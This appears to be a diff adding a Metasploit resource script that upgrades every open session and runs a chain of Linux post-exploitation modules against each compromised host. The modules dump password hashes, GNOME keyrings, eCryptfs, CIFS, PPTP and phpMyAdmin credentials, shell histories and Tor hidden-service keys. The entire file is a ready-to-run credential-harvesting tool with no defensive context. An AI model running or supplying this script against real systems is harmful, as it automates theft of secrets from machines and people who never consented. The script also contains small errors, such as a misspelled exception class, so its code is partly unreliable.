@@ -1,0 +1,118 @@
+<ruby>
+def init_db(username, password, workspace)
+	if username.empty? or password.empty?
+		raise ArgumentError, "You must have a credential to connect to your database"
+	end
+
+	print_status("Connecting to database: #{workspace}")
+	run_single("db_connect #{username}:#{password}@localhost:5432/#{workspace}")
+end
+def is_db_connected?
+	begin
+		framework.db.hosts
+		return true
+	rescue ::ActiveRecord::ConnectionNotEstablished
+		return false
+	end
+end
+def upgrade(session)
+	run_single("sessions -u #{session}")
+end
+def gather(session)
+	run_single("back")
+	print_status("Gathering Loot ... ")
+	run_single("use post/linux/gather/checkcontainer")
+	run_single("set SESSION #{session}")
+	run_single("run -jq")
+	run_single("back")
+        run_single("use post/linux/gather/checkvm")
+        run_single("set SESSION #{session}")
+        run_single("run -jq")
+        run_single("back")
+        run_single("use post/linux/gather/ecryptfs_creds")
+        run_single("set SESSION #{session}")
+        run_single("run -jq")
+        run_single("back")
+	run_single("use post/linux/gather/enum_commands")
+        run_single("set SESSION #{session}")
+        run_single("run -jq")
+        run_single("back")
+	run_single("use post/linux/gather/enum_configs")
+        run_single("set SESSION #{session}")
+        run_single("run -jq")
+        run_single("back")
+	run_single("use post/linux/gather/enum_network")
+        run_single("set SESSION #{session}")
+        run_single("run -jq")
+        run_single("back")
+	run_single("use post/linux/gather/enum_protections")
+        run_single("set SESSION #{session}")
+        run_single("run -jq")
+        run_single("back")
+	run_single("use post/linux/gather/enum_psk")
+        run_single("set SESSION #{session}")
+        run_single("run -jq")
+        run_single("back")
+	run_single("use post/linux/gather/enum_system")
+        run_single("set SESSION #{session}")
+        run_single("run -jq")
+        run_single("back")
+	run_single("use post/linux/gather/enum_users_history")
+        run_single("set SESSION #{session}")
+        run_single("run -jq")
+        run_single("back")
+	run_single("use post/linux/gather/enum_xchat")
+        run_single("set SESSION #{session}")
+        run_single("run -jq")
+        run_single("back")
+	run_single("use post/linux/gather/gnome_commander_creds")
+        run_single("set SESSION #{session}")
+        run_single("run -jq")
+        run_single("back")
+	run_single("use post/linux/gather/gnome_keyring_dump")
+        run_single("set SESSION #{session}")
+        run_single("run -jq")
+        run_single("back")
+	run_single("use post/linux/gather/hashdump")
+        run_single("set SESSION #{session}")
+        run_single("run -jq")
+        run_single("back")
+	run_single("use post/linux/gather/mount_cifs_creds")
+        run_single("set SESSION #{session}")
+        run_single("run -jq")
+        run_single("back")
+	#Disabled by defaut because a PID is required. Uncomment if you want to include this.
+	#run_single("use post/linux/gather/openvpn_credentials")
+        #run_single("set SESSION #{session}")
+	#run_single("set PID ?")
+        #run_single("run -jq")
+        #run_single("back")
+	run_single("use post/linux/gather/phpmyadmin_credsteal")
+        run_single("set SESSION #{session}")
+        run_single("run -jq")
+        run_single("back")
+	run_single("use post/linux/gather/pptpd_chap_secrets")
+        run_single("set SESSION #{session}")
+        run_single("run -jq")
+        run_single("back")
+	run_single("use post/linux/gather/tor_hiddenservices")
+        run_single("set SESSION #{session}")
+        run_single("run -jq")
+        run_single("back")
+        print_status("Complete")
+	print_error("Warning: The SCRIPT was finished successfully though the jobs may not be complete.")
+	rescue ArgumentError => e
+		print_error("Invalid argument: #{e.message}")
+		return
+	rescue RuntimeError => e
+		print_error(e.message)
+		return
+	rescue ::Execption => e
+		raise e
+end
+
+framework.sessions.each_key do |session|
+	upgrade("#{session}")
+	gather("#{session}")
+end
+</ruby>
